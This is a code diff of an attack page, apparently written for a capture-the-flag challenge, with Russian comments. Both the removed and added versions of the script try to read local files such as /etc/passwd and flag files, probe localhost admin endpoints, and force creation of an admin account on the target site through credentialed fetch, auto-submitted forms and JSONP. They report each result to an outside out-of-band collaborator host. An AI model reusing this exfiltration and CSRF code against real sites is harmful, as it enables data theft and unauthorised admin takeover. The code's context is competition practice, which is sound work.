@@ -4,68 +4,69 @@
 <script>
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// 1. Пробуем читать локальные файлы
-const filesToRead = [
+// Методы без CORS:
+
+// 1. Image src для SSRF/чтения файлов
+const testFiles = [
     'file:///etc/passwd',
-    'file:///etc/hosts', 
-    'file:///proc/self/environ',
+    'file:///etc/hosts',
     'file:///flag',
-    'file:///app/flag.txt',
-    'file:///home/flag',
-    'file:///var/www/html/flag.txt'
-];
-
-filesToRead.forEach(file => {
-    setTimeout(() => {
-        fetch(file)
-            .then(r => r.text())
-            .then(data => {
-                // Отправляем данные на collaborator
-                new Image().src = `${COLLAB}/?file=${encodeURIComponent(file)}&data=${encodeURIComponent(data.substring(0, 2000))}`;
-            })
-            .catch(e => {
-                new Image().src = `${COLLAB}/?file=${encodeURIComponent(file)}&error=${encodeURIComponent(e.toString())}`;
-            });
-    }, Math.random() * 3000);
-});
-
-// 2. Пробуем получить доступ к localhost
-const localEndpoints = [
-    'http://localhost/admin',
-    'http://127.0.0.1/admin',
+    'http://localhost/',
+    'http://127.0.0.1/',
     'http://localhost:80/admin',
-    'http://localhost:3000/',
-    'http://localhost:8080/'
+    'http://127.0.0.1:80/admin'
 ];
 
-localEndpoints.forEach(url => {
-    setTimeout(() => {
-        fetch(url)
-            .then(r => r.text())
-            .then(data => {
-                new Image().src = `${COLLAB}/?local=${encodeURIComponent(url)}&data=${encodeURIComponent(data.substring(0, 1500))}`;
-            })
-            .catch(e => {
-                new Image().src = `${COLLAB}/?local=${encodeURIComponent(url)}&error=${encodeURIComponent(e.message)}`;
-            });
-    }, Math.random() * 5000 + 3000);
+testFiles.forEach(file => {
+    const img = new Image();
+    img.onload = () => {
+        // Если загрузилось - ресурс существует
+        new Image().src = `${COLLAB}/?loaded=${encodeURIComponent(file)}`;
+    };
+    img.onerror = (e) => {
+        // Ошибка тоже информация
+        new Image().src = `${COLLAB}/?error=${encodeURIComponent(file)}`;
+    };
+    img.src = file;
 });
 
-// 3. Пробуем создать админа на целевом сайте (если куки есть)
+// 2. Form submission для создания админа (без CORS)
 setTimeout(() => {
-    fetch('https://tasks.goidactf.ru:20499/create_admin', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        credentials: 'include',
-        body: 'new_admin_login=GITHUB_PAGES_EXPLOIT'
-    })
-    .then(r => {
-        new Image().src = `${COLLAB}/?create_admin_status=${r.status}`;
-    })
-    .catch(e => {
-        new Image().src = `${COLLAB}/?create_admin_error=${encodeURIComponent(e.toString())}`;
-    });
-}, 8000);
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://tasks.goidactf.ru:20499/create_admin';
+    form.target = '_blank';
+    form.innerHTML = '<input name="new_admin_login" value="GITHUB_EXPLOIT">';
+    document.body.appendChild(form);
+    form.submit();
+    
+    new Image().src = `${COLLAB}/?form_submitted=yes`;
+}, 2000);
+
+// 3. Script tag для JSONP если поддерживается
+setTimeout(() => {
+    const script = document.createElement('script');
+    script.src = `https://tasks.goidactf.ru:20499/create_admin?callback=myCallback&new_admin_login=JSONP_TEST`;
+    document.body.appendChild(script);
+    
+    window.myCallback = function(data) {
+        new Image().src = `${COLLAB}/?jsonp=${encodeURIComponent(JSON.stringify(data))}`;
+    };
+}, 4000);
+
+// 4. Iframe для загрузки ресурсов
+setTimeout(() => {
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'file:///etc/passwd';
+    iframe.onload = () => {
+        new Image().src = `${COLLAB}/?iframe_file_loaded=yes`;
+    };
+    iframe.onerror = () => {
+        new Image().src = `${COLLAB}/?iframe_file_error=yes`;
+    };
+    document.body.appendChild(iframe);
+}, 6000);
 </script>
 </body>
 </html>
